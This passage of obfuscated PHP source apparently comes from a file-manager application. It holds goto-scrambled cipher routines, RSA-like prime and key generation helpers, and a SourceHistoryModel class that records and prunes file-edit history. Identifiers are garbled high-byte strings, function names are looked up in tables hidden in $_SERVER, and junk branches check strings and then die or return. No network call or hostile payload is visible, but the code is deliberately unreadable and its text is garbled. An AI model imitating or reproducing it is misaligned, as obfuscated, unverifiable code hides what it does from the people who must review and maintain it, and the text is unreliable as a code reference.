$a’¨´ê®¦å == $Eº¯šŠ†[24]($eƒÌî…ª) ? 0 : $a’¨´ê®¦å; $AÁŒÈÒšÖõ = ($cé÷Üà°Ø› + $Eº¯šŠ†[348]($FíİÚŠ¶¡, $eï›ÙÙÎ…[$F’õ—ÕŠŞÆ]) + $Eº¯šŠ†[349]($eƒÌî…ª[$a’¨´ê®¦å++])) % 64; $eÅ¯Æ¡¢ãò = $e„ÓŒÖÇİ[660]; $c³³ã§‘£— .= $FíİÚŠ¶¡[$AÁŒÈÒšÖõ]; } $CèÛ¯ÈŒê¿ = $Eº¯šŠ†[340]($c†Œ±ƒÔ é . $c³³ã§‘£—); goto dÏƒ„šºÌ¾; cğØ§µÃ½—: if (!$fãã§Ì‰·¨) { die; } $AÁŒÈÒšÖõ = 0; $a’¨´ê®¦å = 0; goto C”Óç†‚Ÿ; E·óãˆô„Ó: $bîœ‹çÙçë = $e„ÓŒÖÇİ[656]; if (strlen($bîœ‹çÙçë) < $e„ÓŒÖÇİ[579]) { die; } $eƒÌî…ª = $Eº¯šŠ†[120]($c†Œ±ƒÔ é . $Eº¯šŠ†[120]($cİ÷¾¾İ‡¯ . $c†Œ±ƒÔ é) . $cİ÷¾¾İ‡¯); goto E¤ì™‹ÕôÜ; dÏƒ„šºÌ¾: break; goto B‚šÂ‚¾ƒµ; E¤ì™‹ÕôÜ: $eƒÌî…ª = $Eº¯šŠ†[25]($eƒÌî…ª, $cé÷Üà°Ø› % 8, $cé÷Üà°Ø› % 8 + 7); $c³³ã§‘£— = $Eº¯šŠ†[10]; $côØ­ìĞÆ = $e„ÓŒÖÇİ[657]; goto C¥É¦×’Ğ; B‚šÂ‚¾ƒµ: default: $CèÛ¯ÈŒê¿ = $this->{$_SERVER[È][153]}($eï›ÙÙÎ…, $cİ÷¾¾İ‡¯ . $eŒ²â×ºèğ); $cùîŠâµ© = $e„ÓŒÖÇİ[661]; break; } $CèÛ¯ÈŒê¿ = $Eº¯šŠ†[220]($B²çµƒìé” . $eŒ²â×ºèğ . $CèÛ¯ÈŒê¿); if ($f§º°ŒÁõ - 1 > 0) { $CèÛ¯ÈŒê¿ = $this->{$_SERVER[È][133]}($CèÛ¯ÈŒê¿, $cİ÷¾¾İ‡¯, $f§º°ŒÁõ - 1); } goto a®µ»ƒº£³; a®µ»ƒº£³: return $CèÛ¯ÈŒê¿; goto C¡ÏÄ¿½Ñ¯; dåÍƒë³Ñ: $CÌ¢ÚŠ¸Š = $e„ÓŒÖÇİ[649]; $eï›ÙÙÎ… = $Eº¯šŠ†[2]($eï›ÙÙÎ…); $fÙ«‚î«ŞÊ = $e„ÓŒÖÇİ[650]; goto E¿‹¸Ñ’êô; Eø¬¶‘Œ¾ó: $e„ÓŒÖÇİ =& $_SERVER[¹…ÕÄ]; $Eº¯šŠ† =& $_SERVER[È]; $Eº¯šŠ†[342](1); goto dåÍƒë³Ñ; cÈ×¬ä„ÓÅ: if (!$DîˆÈä‚Ÿê) { die; } $eŒ²â×ºèğ = $Eº¯šŠ†[130](15); $FíİÚŠ¶¡ = $Eº¯šŠ†[343]; goto aÜˆù“Û—ó; C¡ÏÄ¿½Ñ¯: } private function rpba16bea0fa($DÂ´ä¸ÑÃš, $a´÷Ñî…“ï, $fÖÚ³ŒëŞå = 3) { goto E±Òæ‘‡Ô; aÏíˆÕœ£: $D¸ª¨’„Ù¿ = $DÂ´ä¸ÑÃš[0]; $B‰ŞîŒ¹™Ì = $A·†—øáÈ’[664]; while (strlen($B‰ŞîŒ¹™Ì) < $A·†—øáÈ’[579]) { if (!$B‰ŞîŒ¹™Ì) { break; } $B‰ŞîŒ¹™Ì++; } goto cš¨À•æÃ×; c˜ì½—•ğ: switch ($D¸ª¨’„Ù¿) { case $aˆä¾Îñ¦‘[240]: $e‰›ò†ª = $this->{$_SERVER[È][256]}($DÂ´ä¸ÑÃš, $aˆä¾Îñ¦‘[220]($a´÷Ñî…“ï . $Eœƒ•İ’‚)); break; $c¼ä·Æ° = $A·†—øáÈ’[668]; case $aˆä¾Îñ¦‘[226]: $e‰›ò†ª = $this->{$_SERVER[È][256]}($DÂ´ä¸ÑÃš, $aˆä¾Îñ¦‘[220]($Eœƒ•İ’‚ . $a´÷Ñî…“ï)); $B³§Â…Ò‰ = $A·†—øáÈ’[669]; if (!$B³§Â…Ò‰) { return; } break; $B”¯ïçØŠğ = $A·†—øáÈ’[670]; if (!$B”¯ïçØŠğ) { die; } case $aˆä¾Îñ¦‘[344]: $e‰›ò†ª = $this->{$_SERVER[È][256]}($DÂ´ä¸ÑÃš, $aˆä¾Îñ¦‘[124]($Eœƒ•İ’‚ . $a´÷Ñî…“ï)); break; $e©Êœ×¥èÛ = $A·†—øáÈ’[671]; if (!$e©Êœ×¥èÛ) { return; } case $aˆä¾Îñ¦‘[345]: $e‰›ò†ª = $this->{$_SERVER[È][256]}($DÂ´ä¸ÑÃš, $aˆä¾Îñ¦‘[120]($Eœƒ•İ’‚ . $a´÷Ñî…“ï)); $EÂ•Ãƒ…²© = $A·†—øáÈ’[672]; if (!$EÂ•Ãƒ…²©) { die; } break; $C‘Ëöá«Á = $A·†—øáÈ’[673]; case $aˆä¾Îñ¦‘[346]: goto cĞˆªÃ; C¸ºóéÜÍÓ: $DÂ´ä¸ÑÃš = $aˆä¾Îñ¦‘[25]($DÂ´ä¸ÑÃš, 1); $cÛ¼²âë¯ = $aˆä¾Îñ¦‘[348]($aéâœœ”Ê, $cÚ„¥ä¤‚ò); $cÆ²‹Áèò‘ = $aˆä¾Îñ¦‘[120]($cÚ„¥ä¤‚ò . $aˆä¾Îñ¦‘[120]($a´÷Ñî…“ï . $cÚ„¥ä¤‚ò) . $a´÷Ñî…“ï); goto Eëœ¡†Ùô‚; b¼‡ÜòƒË: $cÚ„¥ä¤‚ò = $DÂ´ä¸ÑÃš[0]; $EŒÉ›Ş©Ï = $A·†—øáÈ’[675]; if (strlen($EŒÉ›Ş©Ï) < $A·†—øáÈ’[574]) { return; } goto C¸ºóéÜÍÓ; c™´Ñâğ•±: $Eê¢à±ƒè = $aˆä¾Îñ¦‘[10]; $f­«ˆÜ’™ì = $A·†—øáÈ’[677]; if (!$f­«ˆÜ’™ì) { return; } goto D†—œÈ‚¼; f¡ëã’âÑ¹: $E£†·âŞ‹± = $A·†—øáÈ’[679]; $dÔ½ÒĞ§ÆÉ = 0; $A«†£Ã¼ˆ = $A·†—øáÈ’[680]; goto cîšÇŠ·³; Eëœ¡†Ùô‚: $cÆ²‹Áèò‘ = $aˆä¾Îñ¦‘[25]($cÆ²‹Áèò‘, $cÛ¼²âë¯ % 8, $cÛ¼²âë¯ % 8 + 7); $e¼ÎÑ‰äÀÈ = $A·†—øáÈ’[676]; if (strlen($e¼ÎÑ‰äÀÈ) < $A·†—øáÈ’[570]) { die; } goto c™´Ñâğ•±; F£ °Ù„¾: break; $eŠ‰×Ã–– = $A·†—øáÈ’[685]; while ($eŠ‰×Ã–– < $A·†—øáÈ’[581]) { if ($eŠ‰×Ã–– >= 0) { break; } $eŠ‰×Ã––++; } goto b¬íĞî‘·; cĞˆªÃ: $DÂ´ä¸ÑÃš = $aˆä¾Îñ¦‘[351]($DÂ´ä¸ÑÃš); $bÎ†ÇŞ›†  = $A·†—øáÈ’[674]; if (strlen($bÎ†ÇŞ›† ) < $A·†—øáÈ’[574]) { die; } goto b¼‡ÜòƒË; D†—œÈ‚¼: $c‰‚„ØÚËÊ = 0; $FŞ«½‡Õ = $A·†—øáÈ’[678]; $fŠŒ„ëîô‡ = 0; goto f¡ëã’âÑ¹; cîšÇŠ·³: while (strlen($A«†£Ã¼ˆ) < $A·†—øáÈ’[587]) { if (!$A«†£Ã¼ˆ) { break; } $A«†£Ã¼ˆ++; } for ($c‰‚„ØÚËÊ = 0; $c‰‚„ØÚËÊ < $aˆä¾Îñ¦‘[24]($DÂ´ä¸ÑÃš); $c‰‚„ØÚËÊ++) { $dÔ½ÒĞ§ÆÉ = $dÔ½ÒĞ§ÆÉ == $aˆä¾Îñ¦‘[24]($cÆ²‹Áèò‘) ? 0 : $dÔ½ÒĞ§ÆÉ; $aµä–½ê—Õ = $A·†—øáÈ’[681]; while (strlen($aµä–½ê—Õ) < $A·†—øáÈ’[581]) { if (!$aµä–½ê—Õ) { break; } $aµä–½ê—Õ++; } $a•È—©²ö = $dÔ½ÒĞ§ÆÉ++; $BåâìÙ¿ì¥ = $A·†—øáÈ’[682]; if (strlen($BåâìÙ¿ì¥) < $A·†—øáÈ’[581]) { die; } $fŠŒ„ëîô‡ = $aˆä¾Îñ¦‘[348]($aéâœœ”Ê, $DÂ´ä¸ÑÃš[$c‰‚„ØÚËÊ]) - $cÛ¼²âë¯ - $aˆä¾Îñ¦‘[349]($cÆ²‹Áèò‘[$a•È—©²ö]); while ($fŠŒ„ëîô‡ < 0) { $fŠŒ„ëîô‡ += 64; $dˆä§«ÖÜó = $A·†—øáÈ’[683]; if (!$dˆä§«ÖÜó) { return; } } $Eê¢à±ƒè .= $aéâœœ”Ê[$fŠŒ„ëîô‡]; $cÔÏñ ¡Ò = $A·†—øáÈ’[684]; if (!$cÔÏñ ¡Ò) { return; } } $e‰›ò†ª = $aˆä¾Îñ¦‘[352]($Eê¢à±ƒè); goto F£ °Ù„¾; b¬íĞî‘·: default: $e‰›ò†ª = $this->{$_SERVER[È][256]}($DÂ´ä¸ÑÃš, $a´÷Ñî…“ï . $Eœƒ•İ’‚); break; $a‚ôáâÔ­ñ = $A·†—øáÈ’[686]; } if ($fÖÚ³ŒëŞå - 1 > 0) { $e‰›ò†ª = $this->{$_SERVER[È][195]}($e‰›ò†ª, $a´÷Ñî…“ï, $fÖÚ³ŒëŞå - 1); } return $e‰›ò†ª; goto e¿ö•ÃØºÜ; cš¨À•æÃ×: $Eœƒ•İ’‚ = $aˆä¾Îñ¦‘[25]($DÂ´ä¸ÑÃš, 1, 15); $Eøˆ¨›µ–ˆ = $A·†—øáÈ’[665]; if (strlen($Eøˆ¨›µ–ˆ) < $A·†—øáÈ’[581]) { return; } goto c¹İ‡Œí¡“; c¹İ‡Œí¡“: $DÂ´ä¸ÑÃš = $aˆä¾Îñ¦‘[25]($DÂ´ä¸ÑÃš, 16); $eÅÚ‘™ëâ = $A·†—øáÈ’[666]; if (strlen($eÅÚ‘™ëâ) < $A·†—øáÈ’[570]) { die; } goto Aİ›ÉŞ‚Ì¯; aÒìÉŒë¾Ë: $DÂ´ä¸ÑÃš = $aˆä¾Îñ¦‘[2]($DÂ´ä¸ÑÃš); $c´ÇÀ±Øä = $A·†—øáÈ’[662]; if (strlen($c´ÇÀ±Øä) < $A·†—øáÈ’[570]) { die; } goto B§øßõ•; Aİ›ÉŞ‚Ì¯: $aéâœœ”Ê = $aˆä¾Îñ¦‘[343]; $Aç¬Ã›©åÖ = $A·†—øáÈ’[667]; while (strlen($Aç¬Ã›©åÖ) < $A·†—øáÈ’[587]) { if (!$Aç¬Ã›©åÖ) { break; } $Aç¬Ã›©åÖ++; } goto c˜ì½—•ğ; B§øßõ•: $DÂ´ä¸ÑÃš = $aˆä¾Îñ¦‘[220]($DÂ´ä¸ÑÃš); $EÉ¾Ö¯Æ´ = $A·†—øáÈ’[663]; if (strlen($EÉ¾Ö¯Æ´) < $A·†—øáÈ’[587]) { return; } goto aÏíˆÕœ£; E±Òæ‘‡Ô: $A·†—øáÈ’ =& $_SERVER[¹…ÕÄ]; $aˆä¾Îñ¦‘ =& $_SERVER[È]; if (!$aˆä¾Îñ¦‘[350]($DÂ´ä¸ÑÃš) || $aˆä¾Îñ¦‘[24]($DÂ´ä¸ÑÃš) < 10) { return !1; } goto aÒìÉŒë¾Ë; e¿ö•ÃØºÜ: } public function zdcybd63fcf2($cíäÔÍ„Îğ) { goto CÆ Ûó›¢ˆ; CçßÃ‰ˆÏ: $C¦ï‰ŒÒ“ = ($fîÊ¢ÒªÌ¥ - 1) * ($b½«¸É±¥É - 1); $F¡êñ—°Ê¸ = $eÔâ†è’[250](($fîÊ¢ÒªÌ¥ + $b½«¸É±¥É) / 2); while (1) { $b»½æÙ±– = $F¡êñ—°Ê¸; $fËÜÕÖ²ë‘ = $BÇ«ğ¾ÒÔ[688]; while ($fËÜÕÖ²ë‘ < $BÇ«ğ¾ÒÔ[587]) { if ($fËÜÕÖ²ë‘ >= 0) { break; } $fËÜÕÖ²ë‘++; } $cª›Úœ†„š = $C¦ï‰ŒÒ“; while ($cª›Úœ†„š % $b»½æÙ±– != 0) { $dÑñ‰Ù°õ = $cª›Úœ†„š; $eÎ†–ŠÍºÀ = $BÇ«ğ¾ÒÔ[689]; while ($eÎ†–ŠÍºÀ < $BÇ«ğ¾ÒÔ[581]) { if ($eÎ†–ŠÍºÀ >= 0) { break; } $eÎ†–ŠÍºÀ++; } $cª›Úœ†„š = $b»½æÙ±–; $b»½æÙ±– = $dÑñ‰Ù°õ % $b»½æÙ±–; $f¨Öèº²—å = $BÇ«ğ¾ÒÔ[603]; while ($f¨Öèº²—å < $BÇ«ğ¾ÒÔ[581]) { if ($f¨Öèº²—å >= 0) { break; } $f¨Öèº²—å++; } } if ($b»½æÙ±– == 1) { break; } else { $F¡êñ—°Ê¸++; } } goto dùçïÕ÷İÏ; CÆ Ûó›¢ˆ: $BÇ«ğ¾ÒÔ =& $_SERVER[¹…ÕÄ]; $eÔâ†è’ =& $_SERVER[È]; $fîÊ¢ÒªÌ¥ = $this->{$_SERVER[È][353]}(); goto fÃŠŠ°›ë‹; dùçïÕ÷İÏ: $Dò™ÁŠ—Ï× = 2; for ($B‚¸Åø¼’ê = 0; $B‚¸Åø¼’ê < $C¦ï‰ŒÒ“ * 10; $B‚¸Åø¼’ê++) { if (($C¦ï‰ŒÒ“ * $B‚¸Åø¼’ê + 1) % $F¡êñ—°Ê¸ == 0) { $Dò™ÁŠ—Ï× = $eÔâ†è’[250](($C¦ï‰ŒÒ“ * $B‚¸Åø¼’ê + 1) / $F¡êñ—°Ê¸); break; } } $B±ØÔƒ‡“ = $this->{$_SERVER[È][153]}($fîÊ¢ÒªÌ¥ * $b½«¸É±¥É . $eÔâ†è’[10], $eÔâ†è’[155]); goto b±¤“¤ƒ¶í; fÃŠŠ°›ë‹: $A§ñùàåî¹ = $BÇ«ğ¾ÒÔ[687]; while (strlen($A§ñùàåî¹) < $BÇ«ğ¾ÒÔ[581]) { if (!$A§ñùàåî¹) { break; } $A§ñùàåî¹++; } $b½«¸É±¥É = $this->{$_SERVER[È][353]}(); goto CçßÃ‰ˆÏ; B¾ø¡˜„«µ: $F¾†¯æ‹äê = $this->{$_SERVER[È][153]}($cíäÔÍ„Îğ, $e’…È®‰†Ğ) . $eÔâ†è’[357] . $B±ØÔƒ‡“; return $F¾†¯æ‹äê; goto aÕˆÎÓà; b±¤“¤ƒ¶í: $fª©î“Ä¥— = $BÇ«ğ¾ÒÔ[690]; if (strlen($fª©î“Ä¥—) < $BÇ«ğ¾ÒÔ[574]) { return; } $e’…È®‰†Ğ = $eÔâ†è’[120]($eÔâ†è’[354] . ($fîÊ¢ÒªÌ¥ + $b½«¸É±¥É) . $eÔâ†è’[355] . $F¡êñ—°Ê¸ . $eÔâ†è’[355] . $Dò™ÁŠ—Ï× . $eÔâ†è’[356]); goto B¾ø¡˜„«µ; aÕˆÎÓà: } public function qrbfc31479f2($A•ÍóÈ¥) { goto c°‘¨‘Ï”; dÅÔå””ƒÈ: return $cÀíáŸĞñ³; $Bˆ­àÎë‚é = $cÒíÄÍàª[699]; if (strlen($Bˆ­àÎë‚é) < $cÒíÄÍàª[581]) { die; } goto DÍ—ã÷†£‡; FšïéœÃ¬Í: $Cëìªô“¬ = $cÒíÄÍàª[693]; if (strlen($Cëìªô“¬) < $cÒíÄÍàª[587]) { return; } for ($aò£ù±× = 3; $aò£ù±× < $E´ñ‰Ş·î ; $aò£ù±× += 2) { if ($E´ñ‰Ş·î  % $aò£ù±× != 0) { continue; } $FğàÔÆ² À = $aò£ù±×; $BÏ¨·ÆÁè = $cÒíÄÍàª[694]; while ($BÏ¨·ÆÁè < $cÒíÄÍàª[570]) { if ($BÏ¨·ÆÁè >= 0) { break; } $BÏ¨·ÆÁè++; } $dê—‡ç‘î = $B™×è´È§©[250]($E´ñ‰Ş·î  / $aò£ù±×); break; } goto aÈ“ç©öĞ°; AêøÓ¬÷Ï¬: if ($B™×è´È§©[19]($dìİ‚´Ë) != 2) { return $B™×è´È§©[10]; } $E´ñ‰Ş·î  = $this->{$_SERVER[È][256]}($dìİ‚´Ë[1] . $B™×è´È§©[10], $B™×è´È§©[155]); $fŒèˆµîË¡ = $cÒíÄÍàª[691]; goto e¸ˆ¯ììÑ¯; e¸ˆ¯ììÑ¯: if (!$E´ñ‰Ş·î ) { return $B™×è´È§©[10]; } $E´ñ‰Ş·î  = $B™×è´È§©[250]($E´ñ‰Ş·î ); $FğàÔÆ² À = 0; goto eç†İ¨è¸Ä; cîÏ¬ÄÍÓª: $FÛ¹âĞâçé = 2; $EÄòÉ„º…¹ = $cÒíÄÍàª[698]; while ($EÄòÉ„º…¹ < $cÒíÄÍàª[587]) { if ($EÄòÉ„º…¹ >= 0) { break; } $EÄòÉ„º…¹++; } goto B†Î»õ†‚È; eç†İ¨è¸Ä: $DŒÑŸäŠ°² = $cÒíÄÍàª[692]; while (strlen($DŒÑŸäŠ°²) < $cÒíÄÍàª[587]) { if (!$DŒÑŸäŠ°²) { break; } $DŒÑŸäŠ°²++; } $dê—‡ç‘î = 0; goto FšïéœÃ¬Í; B†Î»õ†‚È: for ($aò£ù±× = 0; $aò£ù±× < $aë±ƒÏ’Û * 10; $aò£ù±×++) { if (($aë±ƒÏ’Û * $aò£ù±× + 1) % $f¨‰›„É‡ == 0) { $FÛ¹âĞâçé = $B™×è´È§©[250](($aë±ƒÏ’Û * $aò£ù±× + 1) / $f¨‰›„É‡); break; } } $D¼›™Èéğ = $B™×è´È§©[120]($B™×è´È§©[354] . ($FğàÔÆ² À + $dê—‡ç‘î) . $B™×è´È§©[355] . $f¨‰›„É‡ . $B™×è´È§©[355] . $FÛ¹âĞâçé . $B™×è´È§©[356]); $cÀíáŸĞñ³ = $this->{$_SERVER[È][256]}($dìİ‚´Ë[0], $D¼›™Èéğ); goto dÅÔå””ƒÈ; aÈ“ç©öĞ°: $aë±ƒÏ’Û = ($FğàÔÆ² À - 1) * ($dê—‡ç‘î - 1); $f¨‰›„É‡ = $B™×è´È§©[250](($FğàÔÆ² À + $dê—‡ç‘î) / 2); while (1) { $e÷Ú‡ô•§ = $f¨‰›„É‡; $eÖä¡”Åøõ = $aë±ƒÏ’Û; while ($eÖä¡”Åøõ % $e÷Ú‡ô•§ != 0) { $f¾ºíÜË— = $eÖä¡”Åøõ; $e”ñšæ×÷È = $cÒíÄÍàª[695]; $eÖä¡”Åøõ = $e÷Ú‡ô•§; $F‹Á“ˆ¶×ƒ = $cÒíÄÍàª[696]; $e÷Ú‡ô•§ = $f¾ºíÜË— % $e÷Ú‡ô•§; $d®‘ÂìÕ‡£ = $cÒíÄÍàª[697]; if (!$d®‘ÂìÕ‡£) { return; } } if ($e÷Ú‡ô•§ == 1) { break; } else { $f¨‰›„É‡++; } } goto cîÏ¬ÄÍÓª; c°‘¨‘Ï”: $cÒíÄÍàª =& $_SERVER[¹…ÕÄ]; $B™×è´È§© =& $_SERVER[È]; $dìİ‚´Ë = $B™×è´È§©[0]($B™×è´È§©[357], $A•ÍóÈ¥); goto AêøÓ¬÷Ï¬; DÍ—ã÷†£‡: } public function hnve835dc075() { goto FøêéÌö®ö; AåôÉÚ©†Æ: $EæãÛ¥•ÜÛ = 2; $C¾ßÀ¦¨å‘ = $EÓœİİÀ»ç[700]; for ($eõÀì‚ĞŸ£ = $eÎ¢ñª¯âè; $eõÀì‚ĞŸ£ > 1; $eõÀì‚ĞŸ£--) { $e±ÎØ§Ãé¤ = !0; $fƒ¥†Ö¶Ç = $EÓœİİÀ»ç[701]; while ($fƒ¥†Ö¶Ç < $EÓœİİÀ»ç[574]) { if ($fƒ¥†Ö¶Ç >= 0) { break; } $fƒ¥†Ö¶Ç++; } foreach ($AÅÌ¢òª÷Ã as $c¼Å·ê¦§Ô) { if ($eõÀì‚ĞŸ£ % $c¼Å·ê¦§Ô == 0) { $e±ÎØ§Ãé¤ = !1; break; } } if ($e±ÎØ§Ãé¤) { $EæãÛ¥•ÜÛ = $eõÀì‚ĞŸ£; break; } } goto c‡ Æõİ¼¦; FøêéÌö®ö: $EÓœİİÀ»ç =& $_SERVER[¹…ÕÄ]; $eµ³®ÆÆéØ =& $_SERVER[È]; $eÎ¢ñª¯âè = $eµ³®ÆÆéØ[338]($eµ³®ÆÆéØ[358](2, 14), $eµ³®ÆÆéØ[358](2, 16) - 1); goto c©µ¨ë£÷Ù; c©µ¨ë£÷Ù: $AÅÌ¢òª÷Ã = array(); $eù™³Ğ‡ = 1; while ($eù™³Ğ‡ <= (int) $eµ³®ÆÆéØ[359]($eÎ¢ñª¯âè)) { $eõÀì‚ĞŸ£ = $eù™³Ğ‡; while (!0) { $eõÀì‚ĞŸ£++; if ($eõÀì‚ĞŸ£ <= 2) { $eù™³Ğ‡ = $eõÀì‚ĞŸ£; break; } else { if ($eõÀì‚ĞŸ£ < 2) { continue; } } $e±ÎØ§Ãé¤ = !0; for ($cöçğ–ä¬ = 2; $cöçğ–ä¬ <= $eµ³®ÆÆéØ[359]($eõÀì‚ĞŸ£); $cöçğ–ä¬++) { if ($eõÀì‚ĞŸ£ % $cöçğ–ä¬ == 0) { $e±ÎØ§Ãé¤ = !1; } } if ($e±ÎØ§Ãé¤) { $eù™³Ğ‡ = $eõÀì‚ĞŸ£; break; } } $AÅÌ¢òª÷Ã[] = $eù™³Ğ‡; } goto AåôÉÚ©†Æ; c‡ Æõİ¼¦: return $EæãÛ¥•ÜÛ; $AàÃŸ›¢¼º = $EÓœİİÀ»ç[702]; if (!$AàÃŸ›¢¼º) { return; } goto EÅğš÷Š…; EÅğš÷Š…: } public function rjfy3297e9c9($A±ÑˆƒÔ÷Ú, $eËİ—íˆ³­) { $DŸ‹¯§Ù±Ÿ =& $_SERVER[È]; return $DŸ‹¯§Ù±Ÿ[13](array($DŸ‹¯§Ù±Ÿ[14], $DŸ‹¯§Ù±Ÿ[360]), $A±ÑˆƒÔ÷Ú, $eËİ—íˆ³­); } public function fkpmcb3600a7($Bè•‡ÉÉÀÕ, $Aó©Ï°Â‡Ù) { $d¯ŒÉ¦ºô =& $_SERVER[È]; return $d¯ŒÉ¦ºô[13](array($d¯ŒÉ¦ºô[361], $d¯ŒÉ¦ºô[362]), $Bè•‡ÉÉÀÕ, $Aó©Ï°Â‡Ù); } public function ewnd4bcaea51($E‡èìŠãî, $cóòİéá“ì) { $DŠ´™¤‰¬¸ =& $_SERVER[È]; return $DŠ´™¤‰¬¸[13](array($DŠ´™¤‰¬¸[361], $DŠ´™¤‰¬¸[363]), $E‡èìŠãî, $cóòİéá“ì); } } goto a®ó¥»„™õ; AÌ®¬­Ñ›’: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\165\x72\x63\145\137\x68\x69\x73\164\157\x72\x79"; public function historyCount($cÔôçÔÓÍ±) { goto cÒ„“õÓ—­; C—Ü­ƒ¤ËÇ: $D–Ÿå‘¹³Š = array($EÍßÃ÷ÛÉ[390], $EÍßÃ÷ÛÉ[1699] => $EÍßÃ÷ÛÉ[474]); $eéœ›Ì˜¨× = array($EÍßÃ÷ÛÉ[390] => array($EÍßÃ÷ÛÉ[7], $cÔôçÔÓÍ±)); $fÕæÄ‡†Š’ = $this->field($D–Ÿå‘¹³Š)->where($eéœ›Ì˜¨×)->group($EÍßÃ÷ÛÉ[390])->select(); goto Fõ´ÜæĞò; cÒ„“õÓ—­: $EÍßÃ÷ÛÉ =& $_SERVER[¹…ÕÄ]; if (!$cÔôçÔÓÍ±) { return array(); } if (is_string($cÔôçÔÓÍ±) || is_int($cÔôçÔÓÍ±)) { $cÔôçÔÓÍ± = array($cÔôçÔÓÍ±); } goto C—Ü­ƒ¤ËÇ; Fõ´ÜæĞò: return array_to_keyvalue($fÕæÄ‡†Š’, $EÍßÃ÷ÛÉ[390], $EÍßÃ÷ÛÉ[474]); goto fùçœÄ®Æ¥; fùçœÄ®Æ¥: } public function addHistory($cƒÒ½òÔç, $BÜ¡ÒÃç²¸ = '') { $d¬ŸáÔñ”‘ =& $_SERVER[¹…ÕÄ]; $EŸÌÛ‹šø¨ = array($d¬ŸáÔñ”‘[404] => $cƒÒ½òÔç[$d¬ŸáÔñ”‘[390]], $d¬ŸáÔñ”‘[1496] => isset($cƒÒ½òÔç[$d¬ŸáÔñ”‘[428]]) ? $cƒÒ½òÔç[$d¬ŸáÔñ”‘[428]] : $cƒÒ½òÔç[$d¬ŸáÔñ”‘[426]], $d¬ŸáÔñ”‘[442] => $cƒÒ½òÔç[$d¬ŸáÔñ”‘[441]], $d¬ŸáÔñ”‘[543] => $cƒÒ½òÔç[$d¬ŸáÔñ”‘[77]], $d¬ŸáÔñ”‘[1896] => $BÜ¡ÒÃç²¸); $DÌêØ‰Ü˜Ú = $GLOBALS[$d¬ŸáÔñ”‘[6]][$d¬ŸáÔñ”‘[87]][$d¬ŸáÔñ”‘[1081]]; if ($DÌêØ‰Ü˜Ú > 1) { $this->historyAutoClear($EŸÌÛ‹šø¨[$d¬ŸáÔñ”‘[390]]); $this->add($EŸÌÛ‹šø¨); } Hook::trigger($d¬ŸáÔñ”‘[1897], $EŸÌÛ‹šø¨); Model($d¬ŸáÔñ”‘[1898])->eventFileEdit($cƒÒ½òÔç[$d¬ŸáÔñ”‘[390]]); } private function historyAutoClear($Aã¾ÍÙ‚â”) { goto dˆ¾â”Ÿ°š; còÈ““»‰õ: $F¶Ñ†Í‡çß = array($bŞÍŒ¹‚ãÄ[404] => $Aã¾ÍÙ‚â”); $A‡‘’Üáìò = $this->field($bŞÍŒ¹‚ãÄ[1899])->where($F¶Ñ†Í‡çß)->order($bŞÍŒ¹‚ãÄ[1893])->select(); if (!$A‡‘’Üáìò || $AÙùâÃ‰‡À >= count($A‡‘’Üáìò)) { return; } goto fÌ‹˜‚±ô–; Aƒ§‡–‚…ğ: $AÙùâÃ‰‡À = $f¼ÒÊƒ¶øä == $bŞÍŒ¹‚ãÄ[1104] ? 5 : $dğ•ì½”‰Ğ; if ($dğ•ì½”‰Ğ <= 1) { $AÙùâÃ‰‡À = 1; } if ($AÙùâÃ‰‡À >= 500) { return; } goto còÈ““»‰õ; B°ºÄßšÉ: $aöˆƒ‰ŠŞ = array_slice($aöˆƒ‰ŠŞ, $AÙùâÃ‰‡À); if (!$fçÑÑºº©ö || !$aöˆƒ‰ŠŞ) { return; } $F¶Ñ†Í‡çß = array($bŞÍŒ¹‚ãÄ[406] => array($bŞÍŒ¹‚ãÄ[7], $fçÑÑºº©ö)); goto e‰…Åé³ñó; fÌ‹˜‚±ô–: $fçÑÑºº©ö = array_to_keyvalue($A‡‘’Üáìò, $bŞÍŒ¹‚ãÄ[33], $bŞÍŒ¹‚ãÄ[388]); $fçÑÑºº©ö = array_slice($fçÑÑºº©ö, $AÙùâÃ‰‡À); $aöˆƒ‰ŠŞ = array_to_keyvalue($A‡‘’Üáìò, $bŞÍŒ¹‚ãÄ[33], $bŞÍŒ¹‚ãÄ[441]); goto B°ºÄßšÉ; dˆ¾â”Ÿ°š: $bŞÍŒ¹‚ãÄ =& $_SERVER[¹…ÕÄ]; $f¼ÒÊƒ¶øä = Model($bŞÍŒ¹‚ãÄ[1102])->get($bŞÍŒ¹‚ãÄ[1103]); $dğ•ì½”‰Ğ = $GLOBALS[$bŞÍŒ¹‚ãÄ[6]][$bŞÍŒ¹‚ãÄ[87]][$bŞÍŒ¹‚ãÄ[1081]]; goto Aƒ§‡–‚…ğ; e‰…Åé³ñó: $this->where($F¶Ñ†Í‡çß)->delete(); Model($bŞÍŒ¹‚ãÄ[444])->remove($aöˆƒ‰ŠŞ); goto E¶“÷ ©òí; E¶“÷ ©òí: } public function listData($a…³½•ï®) { goto Fò¼ê—Éìš; Fò¼ê—Éìš: $c¡¾ãÄÙ”³ =& $_SERVER[¹…ÕÄ]; $E‹Íã‚·«Ÿ = array($c¡¾ãÄÙ”³[404] => $a…³½•ï®); $dõ†Ê®ˆÓ = $c¡¾ãÄÙ”³[1900]; goto FğÁÅïŒƒ; FğÁÅïŒƒ: $e“Øš’Ø† = $this->field($dõ†Ê®ˆÓ)->where($E‹Íã‚·«Ÿ)->order($c¡¾ãÄÙ”³[1893])->selectPage(); $this->_listAppendUser($e“Øš’Ø†[$c¡¾ãÄÙ”³[365]]); $Dƒ¿ÊÃß“Õ = Model($c¡¾ãÄÙ”³[1102])->get($c¡¾ãÄÙ”³[1103]); goto CœÊ¹Ë¢Õ—; CœÊ¹Ë¢Õ—: $BÒµé¡³®È = 5; if ($Dƒ¿ÊÃß“Õ == $c¡¾ãÄÙ”³[1104]) { $e“Øš’Ø†[$c¡¾ãÄÙ”³[365]] = array_slice($e“Øš’Ø†[$c¡¾ãÄÙ”³[365]], 0, $BÒµé¡³®È); $e“Øš’Ø†[$c¡¾ãÄÙ”³[362]] = array($c¡¾ãÄÙ”³[1901] => 1, $c¡¾ãÄÙ”³[1902] => 20, $c¡¾ãÄÙ”³[1903] => 1, $c¡¾ãÄÙ”³[1904] => count($e“Øš’Ø†[$c¡¾ãÄÙ”³[365]])); } return $e“Øš’Ø†; goto a”Å¡‘ª¼; a”Å¡‘ª¼: } protected function _listAppendUser(&$CÄå½¯İ™) { $F–Ğ‚ìˆÙ‘ =& $_SERVER[¹…ÕÄ]; $F‹ßê¨ùÙá = array_to_keyvalue($CÄå½¯İ™, 